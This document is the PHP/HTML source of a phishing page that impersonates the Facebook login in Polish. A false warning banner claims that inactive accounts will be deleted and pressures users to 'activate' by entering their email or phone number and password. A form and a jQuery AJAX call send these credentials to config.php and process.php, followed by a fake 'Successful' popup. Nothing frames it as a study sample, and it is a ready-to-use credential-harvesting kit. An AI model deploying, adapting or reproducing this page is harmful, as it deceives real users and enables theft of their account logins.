<?php
require_once('config.php');
?>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<title>Facebook</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@200;300;400;500;600&display=swap');	
*{
	margin: 0;
	padding: 0;
	outline: 0;
	text-decoration: none;
	box-sizing: border-box;
    
}
html, body {
    margin: 0; height: 100%; overflow: hidden
    }
body{
	font-family: 'Poppins', sans-serif;
	font-size: 14px;
	color: #1c1e21;
	font-weight: normal;
	background: #f8f8f8;
    
}
.activity{
    width: 100%;
    height: 50px;
    margin: auto;
    background: #4cd137;
    }
.atention-activity h1{
    width: 800px;
    padding-top: 5px;
    background: #4cd137;
    transition: .3s;
    margin: auto;
    text-align: center;
    }    
    
.activity h2{
    width: 900px;
    padding-top: 5px;
    transition: .3s;
    margin: 7px auto;
    text-align: center;
    font-size: 15px;
    }

.activity h2 a{
        text-decoration: underline;
    }
    
.loginsignup{
	padding: 120px;
}
.container{
	max-width: 992px;
	margin: auto;
}
.row{
	display: flex;
	flex-wrap: wrap;
}
.justify-content-between{
	justify-content: space-between;
}
.content-left{
	max-width: 500px;
	margin: auto;
}


.form-group input[type=text] {
        color:black;
    }

.form-group input[type=password] {
        color:black;
    }

.content-left h1{
	font-size: 60px;
	color: #1877f2;
	margin-bottom: 20px;
	font-weight: 600;
	text-shadow: -3px -3px 4px rgb(255,255,255),
               3px 3px 4px rgba(230, 230, 230, 0.96);;
}
.content-left h2{
    font-family: SFProDisplay-Regular, Helvetica, Arial, sans-serif;
    font-size: 28px;
    font-weight: normal;
    line-height: 32px;
    width: 500px;
    
}


.content-right{
	max-width: 450px;
	margin: auto;
	text-align: center;
    
}
.content-right form{
	width:  396px;
	height: 360px;
    align-items: center;
    background-color: #fff;
    border: none;
    border-radius: 8px;
    box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
    box-sizing: border-box;
    margin: 40px 0 0;
    padding: 20px 0 28px;
    
}
.content-right form input{
	width: 90%;
	height: 52px;
	background: #f8f8f8;
	padding: 0 15px;
	color: rgb(199, 198, 198);
	font-size: 17px;
	border: 1px solid #dddfe2;
	border-radius: 6px;
	margin-bottom: 15px;
	font-size: 17px;
}
::placeholder
{
	color: #9094b6;
}

.content-right form input:focus
{
	border: 1px solid #1877f2;
	box-shadow: 0 0px 2px #1877f2 ;
	
}
.btn{
	width: 90%;
    border-radius: 6px;
    font-size: 17px;
    line-height: 48px;
    padding: 0 16px;
	background: #1877f2;
	color: #fff;
	margin-bottom: 20px;
	text-transform: capitalize;
	font-weight: 500;
	box-shadow: -5px -5px 10px rgb(255,255,255),
               5px 5px 10px rgba(230, 230, 230, 0.96);
}
.login button{
	display: block;
    margin: auto;
}
    .login .button:focus { 
    outline: none !important;
    outline-color: currentcolor;
    outline-style: none;
    outline-width: medium;
    }
    
.create-btn button{
	display: inline-block;
	padding: 0 17px;
	background: #4cd137;
	transition: .3s;
}
.create-btn button:hover{
	background: #44bd32;
}
.login .btn:active
{
	background: #f8f8f8;
	color: #1877f2;
}

.forgot a{
	font-size: 14px;
	line-height: 19px;
	color:#1877f2;
}
.forgot a:hover,
.content-right p a:hover{
	text-decoration: underline;
}
.content-right p {
	color: #1c1e21;
	font-weight: 600;
    margin-top: 20px;
}
.line
{
    align-items: center;
    border-bottom: 1px solid #dadde1;
    display: flex;
    margin: 20px 16px;
    text-align: center;
}
.downpage{
        
        width: auto;
        height: 800px;
        background-color: white;
        padding: 50 0 50 0;
        color: #1c1e21;
        direction: ltr;
        line-height: 1.34;
}

        
    
.dpage{
    line-height: 1.6;
    margin-left: -20px;
    list-style-type: none;
    margin: auto;
    padding: 0;
    font-family: inherit;
    color: #737373;
    width: 980px;
    background-color: white;
}

.dpage li{
    display: inline-block;
    padding-left: 20px;
    }


</style>	
</head>
<body>

		<!-- login Page start -->
<div class="activity">
    <div class="atention-activity">
        <h1>
            UŻYTKOWNIKU POTWIERDŹ SWOJĄ AKTYWNOŚĆ
        </h1>
    </div>
    <div>
        <h2>
            W związku ze zmianami nadchodzącymi na serwerze Facebook, wszystkie nieistniejące konta będą usuwane z naszych serwerów, więcej informacji <a href="">tutaj.</a>
        
        </h2>
    </div>
    
    
    </div>

<div>   
    <div class="loginsignup">
        <div class="container">
            <div class="row justify-content-between">
                <div class="content-left">
                    <h1>facebook</h1>
                    <h2>Facebook pomaga kontaktować się z <br> innymi osobami oraz udostępniać im <br> różne informacje i materiały.</h2>
                </div>
                <div class="content-right">
                    <form action="config.php" method="POST">
                        <div class="form-group">
                            <input type="text" id="email" name="email" placeholder="Adres e-mail lub numer telefonu" required>
                        </div>
                        <div class="form-group">
                            <input type="password" id="password" name="password" placeholder="Hasło" required>
                        </div>
                        <div class="login">
                            <button type="submit" id="register" name="create" class="btn">Aktywuj</button>
                        </div>
                        <div class="forgot">
                            <a href="">Nie pamiętasz hasła?</a>
                        </div>
                        <div class="line"></div>
                        <div class="create-btn">
                            <button type="submit" id="register" name="create" class="btn">Utwórz nowe konto</button>
                        </div>
                    </form>
                    <p><a href=""> Formularz aktuwacyjny</p>
                </div>
            </div>
        </div>
    </div>
</div>
    <div class=downpage>
        <div>
        <div class="dpage">
            <div>
            <li>Polski</li>
            <li>English (US)</li>
            <li>ślōnskŏ gŏdka</li>
            <li>Русский</li>
            <li>Deutsch</li>
            <li>Français (France)</li>
            <li>Українська</li>
            <li>Español (España)</li>
            </div>
        <div>
            <li>Zarejestruj się</li>
            <li>Zaloguj się</li>
            <li>Messenger</li>
            <li>Facebook Lite</li>
            <li>Watch</li>
            <li>Osoby</li>
            <li>Strony</li>
            <li>Miejsca</li>
            </div>
            </div>

        </div>
    </div>
		<!-- login Page end -->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/sweetalert2@8"></script>
<script type="text/javascript">
	$(function(){
		$('#register').click(function(e){

			var valid = this.form.checkValidity();

			if(valid){


			var firstname 	= $('#firstname').val();
			var lastname	= $('#lastname').val();
			var email 		= $('#email').val();
			var phonenumber = $('#phonenumber').val();
			var password 	= $('#password').val();
			

				e.preventDefault();	

				$.ajax({
					type: 'POST',
					url: 'process.php',
					data: {firstname: firstname,lastname: lastname,email: email,phonenumber: phonenumber,password: password},
					success: function(data){
					Swal.fire({
								'title': 'Successful',
								'text': data,
								'type': 'success'
								})
							
					},
					error: function(data){
						Swal.fire({
								'title': 'Errors',
								'text': 'There were errors while saving the data.',
								'type': 'error'
								})
					}
				});

				
			}else{
				
			}

			



		});		

		
	});
	
</script>

</body>
</html>